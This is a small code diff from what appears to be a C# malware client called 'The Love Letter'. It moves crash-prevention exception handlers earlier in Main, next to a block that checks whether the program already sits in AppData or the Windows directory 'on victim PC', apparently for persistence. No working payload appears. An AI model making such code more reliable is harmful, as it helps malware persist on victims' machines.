@@ -19,6 +19,11 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
+            // make sure this thing wont crash
+            Application.ThreadException += Application_ThreadException;
+
+            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
+
             Console.WriteLine("The Love Letter.");
 
             ArgsParser(args);
@@ -27,10 +32,6 @@ namespace Client
 
             CheckSettings();
 
-            // make sure this thing wont crash
-            Application.ThreadException += Application_ThreadException;
-
-            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
